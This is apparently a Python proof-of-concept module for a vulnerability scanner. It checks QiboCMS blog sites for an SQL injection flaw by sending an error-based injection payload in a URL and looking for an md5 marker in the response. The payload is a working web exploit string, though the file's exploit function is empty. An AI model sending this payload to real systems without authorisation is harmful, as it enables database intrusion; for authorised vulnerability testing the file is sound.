# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'QiboCMS_0006' # 平台漏洞编号，留空
    name = '齐博CMS博客系统注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-04-02'  # 漏洞公布时间
    desc = '''
        齐博CMS博客系统注入.
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=96449' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'QiboCMS'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'eaccaeda-3006-404d-9e22-dcf6ef0ee506'
    author = '国光'  # POC编写者
    create_date = '2018-05-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/blog/index.php?file=viewmusic&uid=1%27&id=1&BM[music_song]=qb_members%20where%201=1%20union%20select%20((select%201%20from%20(select%20count(*),concat((select%20md5(1)),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a))%23' 
            target = '{target}'.format(target=self.target)+payload
            code, head, body, errcode, _url = hh.http(target)
                       
            if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b1' in body:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()